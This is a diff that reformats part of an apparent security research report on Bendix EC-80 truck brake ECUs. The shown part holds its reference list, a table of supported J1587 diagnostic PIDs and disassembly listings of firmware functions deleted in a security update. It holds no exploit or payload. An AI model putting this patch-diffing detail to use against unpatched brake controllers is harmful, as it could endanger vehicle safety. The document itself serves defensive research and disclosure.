+1. Aleph One. (1996). Smashing The Stack For Fun And Profit. _Phrack Magazine_, 7(49). http://phrack.org/issues/49/14.html
 
-2. Intellon Corporation. (1997). _SSC P485 PL Transceiver IC Data Sheet_ .
+2. Intellon Corporation. (1997). _SSC P485 PL Transceiver IC Data Sheet_.
 
-3. Hunter, J. D. (2007). Matplotlib: A 2D graphics environment. _Computing in science & engineering_ , 9(3), 90-95.
+3. Hunter, J. D. (2007). Matplotlib: A 2D graphics environment. _Computing in science & engineering_, 9(3), 90-95.
 
-4. NXP Semiconductors. (2010). _HiWave Debugger_ . Part of CodeWarrior Development Studio.
+4. NXP Semiconductors. (2010). _HiWave Debugger_. Part of CodeWarrior Development Studio.
 
-5. Krzywinski, M., Birol, I., Jones, S. J., & Marra, M. A. (2011). Hive plots—rational approach to visualizing networks. _Brie�ngs in bioinformatics_ , 13(5), 627-644.
-
-43
+5. Krzywinski, M., Birol, I., Jones, S. J., & Marra, M. A. (2011). Hive plots—rational approach to visualizing networks. _Briefings in bioinformatics_, 13(5), 627-644.
 
 ## Slide 44
 
-6. SAE International. (2013). _J1587: Electronic Data Interchange Between Microcomputer Systems in Heavy-Duty Vehicle Applications_ . Warrendale, PA.
+6. SAE International. (2013). _J1587: Electronic Data Interchange Between Microcomputer Systems in Heavy-Duty Vehicle Applications_. Warrendale, PA.
 
-7. Miller, C., & Valasek, C. (2014). _Adventures in Automotive Networks and Control Units_ . IOActive. https://www.ioactive.com/wp-content/uploads/pdfs/IOActive_Adventures_in_ Automotive_Networks_and_Control_Units.pdf
+7. Miller, C., & Valasek, C. (2014). _Adventures in Automotive Networks and Control Units_. IOActive. https://www.ioactive.com/wp-content/uploads/pdfs/IOActive_Adventures_in_Automotive_Networks_and_Control_Units.pdf
 
-8. Behere, S., Zhang, X., Izosimov, V., & Törngren, M. (2016). _A Functional Brake Architecture for Autonomous Heavy Commercial Vehicles_ . https://legacy.sae.org/publications/technicalpapers/content/2016-01-0134/
+8. Behere, S., Zhang, X., Izosimov, V., & Törngren, M. (2016). _A Functional Brake Architecture for Autonomous Heavy Commercial Vehicles_. https://legacy.sae.org/publications/technical-papers/content/2016-01-0134/
 
-9. SAE International. (2016). _J1708: Serial Data Communications Between Microcomputer Systems in Heavy-Duty Vehicle Applications_ . Warrendale, PA.
+9. SAE International. (2016). _J1708: Serial Data Communications Between Microcomputer Systems in Heavy-Duty Vehicle Applications_. Warrendale, PA.
 
-10. TruckHacking organization. (2016). _py-hv-networks_ . https://github.com/TruckHacking/pyhv-networks
+10. TruckHacking organization. (2016). _py-hv-networks_. https://github.com/TruckHacking/py-hv-networks
 
-11. SAE International. (2018). _J1939: Serial Control and Communications Heavy Duty Vehicle Network_ . Warrendale, PA.
+11. SAE International. (2018). _J1939: Serial Control and Communications Heavy Duty Vehicle Network_. Warrendale, PA.
 
-12. International Organization for Standardization. (2018). _ISO 26262: Road vehicles – Functional safety_ . Geneva, Switzerland.
+12. International Organization for Standardization. (2018). _ISO 26262: Road vehicles – Functional safety_. Geneva, Switzerland.
 
-13. International Organization for Standardization. (2018). _ISO/IEC 29147: Information technology – Security techniques – Vulnerability disclosure_ . Geneva, Switzerland.
+13. International Organization for Standardization. (2018). _ISO/IEC 29147: Information technology – Security techniques – Vulnerability disclosure_. Geneva, Switzerland.
 
-14. d�eschko. (2019). _RP1210_ . https://github.com/dfieschko/RP1210
+14. dfieschko. (2019). _RP1210_. https://github.com/dfieschko/RP1210
 
-15. MITRE Corporation. (2020). _CVE-2020-14514_ . https://cve.mitre.org/cgi-bin/cvename.cgi? name=CVE-2020-14514
+15. MITRE Corporation. (2020). _CVE-2020-14514_. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14514
 
-16. International Organization for Standardization. (2020). _ISO 14229: Road vehicles – Uni�ed diagnostic services (UDS)_ . Geneva, Switzerland.
+16. International Organization for Standardization. (2020). _ISO 14229: Road vehicles – Unified diagnostic services (UDS)_. Geneva, Switzerland.
 
-17. Gardiner, B. (2022). Disclosure of con�rmed remote write to J2497 aka PLC4TRUCKS. _NMFTA, Alexandria, VA, Letter, March_ .
+17. Gardiner, B. (2022). Disclosure of confirmed remote write to J2497 aka PLC4TRUCKS. _NMFTA, Alexandria, VA, Letter, March_.
 
-18. National Motor Freight Traf�c Association. (2022). _Actionable Mitigations Options v9_ . https: //nmfta.org/wp-content/media/2022/11/Actionable_Mitigations_Options_v9_DIST.pdf
+18. National Motor Freight Traffic Association. (2022). _Actionable Mitigations Options v9_. https://nmfta.org/wp-content/media/2022/11/Actionable_Mitigations_Options_v9_DIST.pdf
 
-19. MITRE Corporation. (2022). _CVE-2022-26131_ . https://cve.mitre.org/cgi-bin/cvename.cgi? name=CVE-2022-26131
+19. MITRE Corporation. (2022). _CVE-2022-26131_. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26131
 
-20. Pulse Security. (2022). _Reversing the Ducati 696 ECU Part 2_ . https://pulsesecurity.co.nz/ articles/ducati-696-part2
+20. Pulse Security. (2022). _Reversing the Ducati 696 ECU Part 2_. https://pulsesecurity.co.nz/articles/ducati-696-part2
 
-21. Gardiner, B. (2022). Mitigating PLC4TRUCKS Remote Write. _Proceedings of the 9th escar USA Conference_ . https://escar.info/downloads
+21. Gardiner, B. (2022). Mitigating PLC4TRUCKS Remote Write. _Proceedings of the 9th escar USA Conference_. https://escar.info/downloads
 
-22. Cybersecurity and Infrastructure Security Agency. (2023). _Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-by-Design and -Default_ . https://www. cisa.gov/resources-tools/resources/shifting-balance-cybersecurity-risk-principles-andapproaches-security-design-and-default
+22. Cybersecurity and Infrastructure Security Agency. (2023). _Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-by-Design and -Default_. https://www.cisa.gov/resources-tools/resources/shifting-balance-cybersecurity-risk-principles-and-approaches-security-design-and-default
 
-23. Bendix Commercial Vehicle Systems LLC. (2024). _24E086 Chronology_ . https://static.nhtsa. gov/odi/rcl/2024/RMISC-24E086-5355.pdf
+23. Bendix Commercial Vehicle Systems LLC. (2024). _24E086 Chronology_. https://static.nhtsa.gov/odi/rcl/2024/RMISC-24E086-5355.pdf
 
-24. National Highway Traf�c Safety Administration. (2024). _Technical Service Bulletin 10194446_ . https://dot.report/bulletins/10194446
+24. National Highway Traffic Safety Administration. (2024). _Technical Service Bulletin 10194446_. https://dot.report/bulletins/10194446
 
-25. National Highway Traf�c Safety Administration. (2024). _Technical Service Bulletin 10176745_ . https://dot.report/bulletins/10176745
+25. National Highway Traffic Safety Administration. (2024). _Technical Service Bulletin 10176745_. https://dot.report/bulletins/10176745
 
-26. National Highway Traf�c Safety Administration. (2024). _Technical Service Bulletin 10222229_ . https://dot.report/bulletins/10222229
+26. National Highway Traffic Safety Administration. (2024). _Technical Service Bulletin 10222229_. https://dot.report/bulletins/10222229
 
-27. PACCAR Incorporated. (2024). _Safety Recall Report 24V-915_ . https://static.nhtsa.gov/odi/ rcl/2024/RCLRPT-24V915-6438.PDF
+27. PACCAR Incorporated. (2024). _Safety Recall Report 24V-915_. https://static.nhtsa.gov/odi/rcl/2024/RCLRPT-24V915-6438.PDF
 
-28. Navistar, Inc. (2024). _Safety Recall Report 24V-818_ . https://static.nhtsa.gov/odi/rcl/2024/
-
-44
+28. Navistar, Inc. (2024). _Safety Recall Report 24V-818_. https://static.nhtsa.gov/odi/rcl/2024/
 
 ## Slide 45
 
 RCLRPT-24V818-4283.PDF
 
-29. Volvo Trucks North America. (2024). _Safety Recall Report 24V-790_ . https://static.nhtsa.gov/ odi/rcl/2024/RCLRPT-24V790-3386.PDF
+29. Volvo Trucks North America. (2024). _Safety Recall Report 24V-790_. https://static.nhtsa.gov/odi/rcl/2024/RCLRPT-24V790-3386.PDF
 
-30. Bendix Commercial Vehicle Systems LLC. (2024). _Technical Bulletin TCH-27-007_ . https:// www.bendix.com/media/services-and-support/product-action-center-pdfs/tch_27_007_ en_000.pdf
+30. Bendix Commercial Vehicle Systems LLC. (2024). _Technical Bulletin TCH-27-007_. https://www.bendix.com/media/services-and-support/product-action-center-pdfs/tch_27_007_en_000.pdf
 
-31. Bendix Commercial Vehicle Systems LLC. (2024). _Technical Bulletin TCH-27-006_ . https:// www.bendix.com/media/services-and-support/product-action-center-pdfs/tch_27_006_ en_000.pdf
+31. Bendix Commercial Vehicle Systems LLC. (2024). _Technical Bulletin TCH-27-006_. https://www.bendix.com/media/services-and-support/product-action-center-pdfs/tch_27_006_en_000.pdf
 
-32. Bendix Commercial Vehicle Systems LLC. (2024). _Technical Bulletin TCH-27-008_ . https:// www.bendix.com/media/services-and-support/product-action-center-pdfs/tch-27-008_ en_000.pdf
+32. Bendix Commercial Vehicle Systems LLC. (2024). _Technical Bulletin TCH-27-008_. https://www.bendix.com/media/services-and-support/product-action-center-pdfs/tch-27-008_en_000.pdf
 
-33. ZF Friedrichshafen AG. (2024). _mBSP XBS Factsheet_ . https://www.zf.com/public/org/ZF_ CVS_mBSP_XBS_Factsheet_EN_296135.pdf
+33. ZF Friedrichshafen AG. (2024). _mBSP XBS Factsheet_. https://www.zf.com/public/org/ZF_CVS_mBSP_XBS_Factsheet_EN_296135.pdf
 
-34. Technology & Maintenance Council. (2024). _Position Paper 2024-3: Next Generation TractorTrailer Technical Needs_ . American Trucking Associations. https://tmc.trucking.org/sites/ default/files/TMC_PP-2024_3_NEXTGEN_TRACTOR_TRAILER_TECHNICAL_NEEDS%20. pdf
+34. Technology & Maintenance Council. (2024). _Position Paper 2024-3: Next Generation Tractor-Trailer Technical Needs_. American Trucking Associations. https://tmc.trucking.org/sites/default/files/TMC_PP-2024_3_NEXTGEN_TRACTOR_TRAILER_TECHNICAL_NEEDS%20.pdf
 
-35. Gardiner, B., Maag, J., & Tindell, K. (2024). _Security Requirements for Vehicle Security Gateways_ . SAE International. https://www.sae.org/papers/security-requirements-vehiclesecurity-gateways-2024-01-2806
+35. Gardiner, B., Maag, J., & Tindell, K. (2024). _Security Requirements for Vehicle Security Gateways_. SAE International. https://www.sae.org/papers/security-requirements-vehicle-security-gateways-2024-01-2806
 
-36. Vehicle Cybersecurity Working Group (VCRWG), National Motor Freight Traf�c Association. (2024). _NMFTA Vehicle Cybersecurity Requirements_ . https://github.com/nmfta-repo/nmftavehicle_cybersecurity_requirements
+36. Vehicle Cybersecurity Working Group (VCRWG), National Motor Freight Traffic Association. (2024). _NMFTA Vehicle Cybersecurity Requirements_. https://github.com/nmfta-repo/nmfta-vehicle_cybersecurity_requirements
 
-37. python-can Developers. (2024). _python-can_ . https://python-can.readthedocs.io/
+37. python-can Developers. (2024). _python-can_. https://python-can.readthedocs.io/
 
-38. Cohen, R., David, R., Mori, R., Yger, F., & Rossi, F. (2024). Improving binary dif�ng through similarity and matching intricacies. _Proc. of the 6th Conference on Arti�cial Intelligence for Defense_ .
+38. Cohen, R., David, R., Mori, R., Yger, F., & Rossi, F. (2024). Improving binary diffing through similarity and matching intricacies. _Proc. of the 6th Conference on Artificial Intelligence for Defense_.
 
-39. Quarkslab. (2024). _Quokka_ . https://github.com/quarkslab/quokka
+39. Quarkslab. (2024). _Quokka_. https://github.com/quarkslab/quokka
 
-40. Bendix Commercial Vehicle Systems LLC. (2025). _Safety Recall Report 25E-073_ . https:// static.nhtsa.gov/odi/rcl/2025/RCLRPT-25E073-3346.pdf
+40. Bendix Commercial Vehicle Systems LLC. (2025). _Safety Recall Report 25E-073_. https://static.nhtsa.gov/odi/rcl/2025/RCLRPT-25E073-3346.pdf
 
-41. National Motor Freight Traf�c Association. (2025). _Bendix EC80 Recall: Safety and Security Implications_ . https://nmfta.org/bendix-ec80-recall-safety-and-security-implications/
+41. National Motor Freight Traffic Association. (2025). _Bendix EC80 Recall: Safety and Security Implications_. https://nmfta.org/bendix-ec80-recall-safety-and-security-implications/
 
-42. Cybersecurity and Infrastructure Security Agency. (2025). _ICS Advisory (ICSA-25-021-03) Bendix EC-80_ . https://www.cisa.gov/news-events/ics-advisories/icsa-25-021-03
+42. Cybersecurity and Infrastructure Security Agency. (2025). _ICS Advisory (ICSA-25-021-03) Bendix EC-80_. https://www.cisa.gov/news-events/ics-advisories/icsa-25-021-03
 
-43. National Security Agency. (2025). _Ghidra_ . https://ghidra-sre.org/
+43. National Security Agency. (2025). _Ghidra_. https://ghidra-sre.org/
 
-44. Hiveplotlib Developers. (2025). _hiveplotlib_ . https://github.com/hiveplotlib/hiveplotlib
+44. Hiveplotlib Developers. (2025). _hiveplotlib_. https://github.com/hiveplotlib/hiveplotlib
 
-45. Land Line Media. (2025). _Defective Bendix ECUs have prompted recall of nearly half a million trucks with latest Paccar recall_ . https://landline.media/defective-bendix-ecus-haveprompted-recall-of-nearly-half-a-million-trucks-with-latest-paccar-recall/
+45. Land Line Media. (2025). _Defective Bendix ECUs have prompted recall of nearly half a million trucks with latest Paccar recall_. https://landline.media/defective-bendix-ecus-have-prompted-recall-of-nearly-half-a-million-trucks-with-latest-paccar-recall/
 
-46. SAE Truck and Bus Control and Communications Network Committee. (2026). _J2497 Power Line Carrier Communications for Commercial Vehicles_ . Work in Progress Draft Revision.
+46. SAE Truck and Bus Control and Communications Network Committee. (2026). _J2497 Power Line Carrier Communications for Commercial Vehicles_. Work in Progress Draft Revision.
 
-47. Hex-Rays. (2026). _IDA Pro_ . https://hex-rays.com/ida-pro/
+47. Hex-Rays. (2026). _IDA Pro_. https://hex-rays.com/ida-pro/
 
-48. Python Software Foundation. (2026). _Python Programming Language_ . https://www.python. org/
+48. Python Software Foundation. (2026). _Python Programming Language_. https://www.python.org/
 
-49. Graphviz Authors. (2026). _Graphviz_ . https://graphviz.org/
+49. Graphviz Authors. (2026). _Graphviz_. https://graphviz.org/
 
-50. ELDB. _XPROG-box_ . https://www.eldb.eu/
+50. ELDB. _XPROG-box_. https://www.eldb.eu/
 
-51. PEmicro. _PROGS12Z Flash Programmer Software_ . https://www.pemicro.com/
-
-45
+51. PEmicro. _PROGS12Z Flash Programmer Software_. https://www.pemicro.com/
 
 ## Slide 46
 
-52. NXP Semiconductors. _MC9S12XEQ512 Data Sheet_ . https://www.nxp.com/docs/en/datasheet/MC9S12XEP100.pdf
+52. NXP Semiconductors. _MC9S12XEQ512 Data Sheet_. https://www.nxp.com/docs/en/data-sheet/MC9S12XEP100.pdf
 
-53. NXP Semiconductors. _MC9S12XE Family Reference Manual_ . https://www.nxp.com/docs/en/ reference-manual/MC9S12XERM.pdf
+53. NXP Semiconductors. _MC9S12XE Family Reference Manual_. https://www.nxp.com/docs/en/reference-manual/MC9S12XERM.pdf
 
-54. DARPA. _Assured Micropatching (AMP)_ . https://www.darpa.mil/program/assuredmicropatching
+54. DARPA. _Assured Micropatching (AMP)_. https://www.darpa.mil/program/assured-micropatching
 
-55. LinkerScope Developers. _LinkerScope_ . Visualization Tool.
+55. LinkerScope Developers. _LinkerScope_. Visualization Tool.
 
-56. Zynamics. _BinDiff_ . https://www.zynamics.com/bindiff.html
+56. Zynamics. _BinDiff_. https://www.zynamics.com/bindiff.html
 
-57. hotwolf. _HSW12_ . https://github.com/hotwolf/HSW12
+57. hotwolf. _HSW12_. https://github.com/hotwolf/HSW12
 
-58. National Highway Traf�c Safety Administration. _NHTSA Recalls by Manufacturer_ . https:// datahub.transportation.gov/Automobiles/NHTSA-Recalls-by-Manufacturer/mu99-t4jn
+58. National Highway Traffic Safety Administration. _NHTSA Recalls by Manufacturer_. https://datahub.transportation.gov/Automobiles/NHTSA-Recalls-by-Manufacturer/mu99-t4jn
 
-59. Yapo, T. _FL2K Experiments_ . https://hackaday.io/project/164346-fl2k-sdr
+59. Yapo, T. _FL2K Experiments_. https://hackaday.io/project/164346-fl2k-sdr
 
-60. Osmocom. _Osmo-FL2k Project_ . https://osmocom.org/projects/osmo-fl2k
+60. Osmocom. _Osmo-FL2k Project_. https://osmocom.org/projects/osmo-fl2k
 
-61. National Highway Traf�c Safety Administration. _Federal Motor Vehicle Safety Standard No. 121, Air Brake Systems_ . 49 CFR 571.121.
+61. National Highway Traffic Safety Administration. _Federal Motor Vehicle Safety Standard No. 121, Air Brake Systems_. 49 CFR 571.121.
 
-62. Evenchick, E. _CANtact_ . https://cantact.io/
+62. Evenchick, E. _CANtact_. https://cantact.io/
 
-63. National Motor Freight Traf�c Association. _j2497-keyhole_ . https://github.com/nmfta-repo/ j2497-keyhole
+63. National Motor Freight Traffic Association. _j2497-keyhole_. https://github.com/nmfta-repo/j2497-keyhole
 
-64. Motorola. _Motorola S-Record Description (PDF)_ . https://deramp.com/downloads/mfe_ archive/060-Standards%20and%20Specifications/Hex%20Data%20Formats/Motorola% 20S%20Record.pdf
+64. Motorola. _Motorola S-Record Description (PDF)_. https://deramp.com/downloads/mfe_archive/060-Standards%20and%20Specifications/Hex%20Data%20Formats/Motorola%20S%20Record.pdf
 
 ## **Appendix A: Supported J1587 PIDs**
 
 |J1708 message|PID / PID Request Description|Data Input Size|
 |---|---|---|
-|mm0031 / mm803188|Request for 0x31 49 ABS
-Control Status|one byte data (broadcast req)
-/ zero bytes data (unicast req)|
-|mm003E / mm803E88|Request for 0x3E 62 Retarder
-Inhibit Status|one byte data / zero bytes
-data|
-|mm0054 / mm805488|Request for 0x54 84 Road
-Speed|one byte data / zero bytes
-data|
-|mm0097 / mm809788|Request for 0x97 151 TC
-Control State|one byte data / zero bytes
-data|
-|mm009E / mm809E88|Request for 0x9E 158 Battery
-Potential (V), Switched|one byte data / zero bytes
-data|
-|mm00A8 / mm80A888|Request for 0xA8 168 Battery
-Potential (V)|one byte data / zero bytes
-data|
-|mm00C2 / mm80C288|Request for 0xC2 194
-Transmitter System
-Diagnostic Code and
-Occurrence Count Table|one byte data / zero bytes
-data|
-
-46
+|mm0031 / mm803188|Request for 0x31 49 ABS Control Status|one byte data (broadcast req) / zero bytes data (unicast req)|
+|mm003E / mm803E88|Request for 0x3E 62 Retarder Inhibit Status|one byte data / zero bytes data|
+|mm0054 / mm805488|Request for 0x54 84 Road Speed|one byte data / zero bytes data|
+|mm0097 / mm809788|Request for 0x97 151 TC Control State|one byte data / zero bytes data|
+|mm009E / mm809E88|Request for 0x9E 158 Battery Potential (V), Switched|one byte data / zero bytes data|
+|mm00A8 / mm80A888|Request for 0xA8 168 Battery Potential (V)|one byte data / zero bytes data|
+|mm00C2 / mm80C288|Request for 0xC2 194 Transmitter System Diagnostic Code and Occurrence Count Table|one byte data / zero bytes data|
 
 ## Slide 47
 
 |J1708 message|PID / PID Request Description|Data Input Size|
 |---|---|---|
-|mm00C4 / mm80C488|Request for 0xC4 196
-Diagnostic Data/Count Clear
-Response|one byte data / zero bytes
-data|
-|mm00C7 / mm80C788|Request for 0xC7 199
-Traction Control Disable State|one byte data / zero bytes
-data|
-|mm00D1 / mm80D188|Request for 0xD1 209 ABS
-Control Status, Trailer|one byte data / zero bytes
-data|
-|mm00D6 / mm80D688|Request for 0xD6 214 Vehicle
-Wheel Speeds|one byte data / zero bytes
-data|
-|mm00E9 / mm80E988|Request for 0xE9 233 Unit
-Number (Power Unit)|one byte data / zero bytes
-data|
-|mm00EA / mm80EA88|Request for 0xEA 234
-Software Identi�cation|one byte data / zero bytes
-data|
-|mm00ED / mm80ED88|Request for 0xED 237 Vehicle
-Identi�cation Number|one byte data / zero bytes
-data|
-|mm00F3 / mm80F388|Request for 0xF3 243
-Component Identi�cation|one byte data / zero bytes
-data|
+|mm00C4 / mm80C488|Request for 0xC4 196 Diagnostic Data/Count Clear Response|one byte data / zero bytes data|
+|mm00C7 / mm80C788|Request for 0xC7 199 Traction Control Disable State|one byte data / zero bytes data|
+|mm00D1 / mm80D188|Request for 0xD1 209 ABS Control Status, Trailer|one byte data / zero bytes data|
+|mm00D6 / mm80D688|Request for 0xD6 214 Vehicle Wheel Speeds|one byte data / zero bytes data|
+|mm00E9 / mm80E988|Request for 0xE9 233 Unit Number (Power Unit)|one byte data / zero bytes data|
+|mm00EA / mm80EA88|Request for 0xEA 234 Software Identification|one byte data / zero bytes data|
+|mm00ED / mm80ED88|Request for 0xED 237 Vehicle Identification Number|one byte data / zero bytes data|
+|mm00F3 / mm80F388|Request for 0xF3 243 Component Identification|one byte data / zero bytes data|
 |mm2A|42 Pressure Switch Status|1 byte data|
-|mm46|70 Parking Brake Switch
-Status|1 byte data|
+|mm46|70 Parking Brake Switch Status|1 byte data|
 |mm54|84 Road Speed|1 byte data|
 |mm75|117 Brake Primary Pressure|1 byte data|
-|mm76|118 Brake Secondary
-Pressure|1 byte data|
-|mmA9|169 Cargo Ambient
-Temperature|2 bytes data|
+|mm76|118 Brake Secondary Pressure|1 byte data|
+|mmA9|169 Cargo Ambient Temperature|2 bytes data|
 |mmB4|180 Trailer Weight|2 bytes data|
-|mmC2|194 Transmitter System
-Diagnostic Code and
-Occurrence Count Table|variable bytes data. byte
-count, followed by sets of
-diagnostic data|
-|mmC303|195 Diagnostic Data Request /
-Clear|3 bytes data|
-|mmC7|199 Traction Control Disable
-State|variable length data. byte
-count, state flags, ASCII
-‘access code’ of 0-15
-characters selected by the
-manufacturer …|
-|mmD1|209 ABS Control Status,
-Trailer|variable bytes data, up to 3x5
-bytes for 5 trailers byte count,
-followed by the status bytes|
-
-47
+|mmC2|194 Transmitter System Diagnostic Code and Occurrence Count Table|variable bytes data. byte count, followed by sets of diagnostic data|
+|mmC303|195 Diagnostic Data Request / Clear|3 bytes data|
+|mmC7|199 Traction Control Disable State|variable length data. byte count, state flags, ASCII ‘access code’ of 0-15 characters selected by the manufacturer …|
+|mmD1|209 ABS Control Status, Trailer|variable bytes data, up to 3x5 bytes for 5 trailers byte count, followed by the status bytes|
 
 ## Slide 48
 
 |J1708 message|PID / PID Request Description|Data Input Size|
 |---|---|---|
-|mmED|237 Vehicle Identi�cation
-Number|variable bytes data. byte
-count, followed by the VIN
-ASCII|
+|mmED|237 Vehicle Identification Number|variable bytes data. byte count, followed by the VIN ASCII|
 |mmF5|245 Total Vehicle Distance|4 bytes data|
 |mmF7|257 Total Engine Hours|4 bytes data|
-|mmFE88C5 / mmFE88C6|254 Proprietary DLE|permitted lengths of only
-0xC5 and 0xC6|
-|mmFF73|115 Trailer Pneumatic Supply
-Line Pressure|one byte data|
+|mmFE88C5 / mmFE88C6|254 Proprietary DLE|permitted lengths of only 0xC5 and 0xC6|
+|mmFF73|115 Trailer Pneumatic Supply Line Pressure|one byte data|
 |mmFF7B|123 Door Status|one byte data|
 
 ## **Appendix: Disassembly Listings**
 
 ### **Target 2ec80**
 
-This appendix lists all the deleted: 1) functions, 2) the PID handlers, post process and context tables, and 3) an .s19 �le containing these bytes. This is based on the QBinDiff analysis described in Sections , and .
+This appendix lists all the deleted: 1) functions, 2) the PID handlers, post process and context tables, and 3) an .s19 file containing these bytes. This is based on the QBinDiff analysis described in Sections , and .
 
 #### **Deleted Functions**
 
-All functions unmatched in the ‘before update’ �rmware.
+All functions unmatched in the ‘before update’ firmware.
 
 #### **sub_C93F** :
 
-**00C93F:** F60010 **ldab** MMC_GPAGE _; Load B_ **00C942:** FE0016 **ldx** MMC_RPAGE _; Load X_ **00C945:** 37 **pshb** _; Push B_ **00C946:** 34 **pshx** _; Push X_ **00C947:** C7 clrb _; Clear B_ **00C948:** 4A80DEEC **call** gone_PITHandler_clrPIT_callEBBB47_02_argBis0_EC80DE,#0xEC _; Call_ ↪ _subroutine in expanded memory_ **00C94C:** 30 **pulx** _; Pull X_ **00C94D:** 33 **pulb** _; Pull B_ **00C94E:** 7E0016 **stx** MMC_RPAGE _; Store X_ **00C951:** 7B0010 **stab** MMC_GPAGE _; Store B_ **00C954:** 0B **rti** _; Return from interrupt_
+```
+00C93F: F60010    ldab    MMC_GPAGE; Load B
+00C942: FE0016    ldx     MMC_RPAGE; Load X
+00C945: 37        pshb; Push B
+00C946: 34        pshx; Push X
+00C947: C7        clrb; Clear B
+00C948: 4A80DEEC  call    gone_PITHandler_clrPIT_callEBBB47_02_argBis0_EC80DE,#0xEC; Call
+↪   subroutine in expanded memory
+00C94C: 30        pulx; Pull X
+00C94D: 33        pulb; Pull B
+00C94E: 7E0016    stx     MMC_RPAGE; Store X
+00C951: 7B0010    stab    MMC_GPAGE; Store B
+00C954: 0B        rti; Return from interrupt
+```
 
-**sub_E5B396** :
-
-48
+#### **sub_E5B396** :
 
 ## Slide 49
 
-|**E5B396:**
-**E5B399:**|F7331B
-**tst**
- 2703
-**beq**|byte_331B_; _
-loc_E5B39E_;_|_Test memory for zero or minus_
- _Branch if equal_|
-|---|---|---|---|
-|**E5B39B:**|73331B
-**dec**|byte_331B_; _|_Decrement memory_|
-|**E5B39E:**|F7331D
-**tst**|byte_331D_; _|_Test memory for zero or minus_|
-|**E5B3A1:**|2703
-**beq**|loc_E5B3A6_;_|_Branch if equal_|
-|**E5B3A3:**|73331D
-**dec**|byte_331D_; _|_Decrement memory_|
-|**E5B3A6:**|F7331E
-**tst**|byte_331E_; _|_Test memory for zero or minus_|
-|**E5B3A9:**|2703
-**beq**|loc_E5B3AE_;_|_Branch if equal_|
-|**E5B3AB:**|73331E
-**dec**|byte_331E_; _|_Decrement memory_|
-|**E5B3AE:**|F73320
-**tst**|byte_3320_; _|_Test memory for zero or minus_|
-|**E5B3B1:**|2703
-**beq**|loc_E5B3B6_;_|_Branch if equal_|
-|**E5B3B3:**|733320
-**dec**|byte_3320_; _|_Decrement memory_|
-|**E5B3B6:**|F7331F
-**tst**|byte_331F_; _|_Test memory for zero or minus_|
-|**E5B3B9:**|2703
-**beq**|loc_E5B3BE_;_|_Branch if equal_|
-|**E5B3BB:**|73331F
-**dec**|byte_331F_; _|_Decrement memory_|
-|**E5B3BE:**|F7331C
-**tst**|byte_331C_; _|_Test memory for zero or minus_|
-|**E5B3C1:**|2703
-**beq**|loc_E5B3C6_;_|_Branch if equal_|
-|**E5B3C3:**|73331C
-**dec**|byte_331C_; _|_Decrement memory_|
-|**E5B3C6:**|F733B3
-**tst**|byte_33B3_; _|_Test memory for zero or minus_|
-|**E5B3C9:**|2703
-**beq**|loc_E5B3CE_;_|_Branch if equal_|
-|**E5B3CB:**|7333B3
-**dec**|byte_33B3_; _|_Decrement memory_|
-|**E5B3CE:**|F73321
-**tst**|byte_3321_; _|_Test memory for zero or minus_|
-|**E5B3D1:**|2703
-**beq**|locret_E5B3|D6_; Branch if equal_|
-|**E5B3D3:**|733321
-**dec**|byte_3321_; _|_Decrement memory_|
-|**E5B3D6:**|0A
-**rtc**_; _|_Return from ca_|_ll_|
+```
+E5B396: F7331B        tst     byte_331B; Test memory for zero or minus
+E5B399: 2703          beq     loc_E5B39E; Branch if equal
+E5B39B: 73331B        dec     byte_331B; Decrement memory
+E5B39E: F7331D        tst     byte_331D; Test memory for zero or minus
+E5B3A1: 2703          beq     loc_E5B3A6; Branch if equal
+E5B3A3: 73331D        dec     byte_331D; Decrement memory
+E5B3A6: F7331E        tst     byte_331E; Test memory for zero or minus
+E5B3A9: 2703          beq     loc_E5B3AE; Branch if equal
+E5B3AB: 73331E        dec     byte_331E; Decrement memory
+E5B3AE: F73320        tst     byte_3320; Test memory for zero or minus
+E5B3B1: 2703          beq     loc_E5B3B6; Branch if equal
+E5B3B3: 733320        dec     byte_3320; Decrement memory
+E5B3B6: F7331F        tst     byte_331F; Test memory for zero or minus
+E5B3B9: 2703          beq     loc_E5B3BE; Branch if equal
+E5B3BB: 73331F        dec     byte_331F; Decrement memory
+E5B3BE: F7331C        tst     byte_331C; Test memory for zero or minus
+E5B3C1: 2703          beq     loc_E5B3C6; Branch if equal
+E5B3C3: 73331C        dec     byte_331C; Decrement memory
+E5B3C6: F733B3        tst     byte_33B3; Test memory for zero or minus
+E5B3C9: 2703          beq     loc_E5B3CE; Branch if equal
+E5B3CB: 7333B3        dec     byte_33B3; Decrement memory
+E5B3CE: F73321        tst     byte_3321; Test memory for zero or minus
+E5B3D1: 2703          beq     locret_E5B3D6; Branch if equal
+E5B3D3: 733321        dec     byte_3321; Decrement memory
+E5B3D6: 0A            rtc; Return from call
+```
 
 #### **sub_E8BC93** :
 
-|**E8BC93:**|37|**pshb**_; _|_Push B_|
-|---|---|---|---|
-|**E8BC94:**|7B294C|**stab**|byte_294C_; Store B_|
-|**E8BC97:**|180429452949|**movw**|word_2945,word_2949_; Move word (16-bit)_|
-|**E8BC9D:**|18792945|**clrw**|word_2945|
-|**E8BCA1:**|180429432947|**movw**|word_2943,word_2947_; Move word (16-bit)_|
-|**E8BCA7:**|18792943|**clrw**|word_2943|
-|**E8BCAB:**|E680|**ldab**|1+var_1,**sp**_; Load B_|
-|**E8BCAD:**|87|clra_; _|_Clear A_|
-|**E8BCAE:**|B746|**tfr**|d,y_; Transfer register to register_|
-|**E8BCB0:**|1858|asly||
-|**E8BCB2:**|C601|**ldab**|#1_; Load B_|
-|**E8BCB4:**|6CEA2953|**std**|0x2953,y_; Store D_|
-|**E8BCB8:**|1B81|**ins**_; _|_Increment SP_|
-|**E8BCBA:**|0A|**rtc**_; _|_Return from call_|
+```
+E8BC93: 37            pshb; Push B
+E8BC94: 7B294C        stab    byte_294C; Store B
+E8BC97: 180429452949  movw    word_2945,word_2949; Move word (16-bit)
+E8BC9D: 18792945      clrw    word_2945
+E8BCA1: 180429432947  movw    word_2943,word_2947; Move word (16-bit)
+E8BCA7: 18792943      clrw    word_2943
+E8BCAB: E680          ldab    1+var_1,sp; Load B
+E8BCAD: 87            clra; Clear A
+E8BCAE: B746          tfr     d,y; Transfer register to register
+E8BCB0: 1858          asly
+E8BCB2: C601          ldab    #1; Load B
+E8BCB4: 6CEA2953      std     0x2953,y; Store D
+E8BCB8: 1B81          ins; Increment SP
+E8BCBA: 0A            rtc; Return from call
+```
 
 #### **sub_E8BCBF** :
 
